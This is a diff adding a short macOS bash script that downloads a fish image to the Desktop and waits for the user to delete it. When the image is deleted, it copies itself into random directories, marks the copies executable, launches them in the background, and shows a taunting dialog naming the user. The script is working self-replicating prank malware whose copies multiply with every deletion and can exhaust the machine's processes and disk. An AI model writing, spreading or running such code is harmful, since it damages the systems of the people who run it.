@@ -1,0 +1,16 @@
+#!/bin/bash
+
+fshloc="https://rundirty.files.wordpress.com/2012/09/swedishfish.jpg"
+fshhome="$HOME/Desktop/fish$RANDOM.jpg"
+curl $fshloc > $fshhome # REDFLAG
+while [[ -f $fshhome ]]; do sleep 5; done
+for k in {0..2}; do
+    ncopy="$(find . -type d -depth 2 | shuf -n 1)/$RANDOM"
+    cp $0 "$ncopy"
+    chmod +x "$ncopy"
+    $ncopy & disown 
+done
+echo "set theDialogText to \"Hey, \" & (system attribute \"USER\") & \". Why did you delete my phish??\"
+display dialog theDialogText" | osascript &>/dev/null
+
+
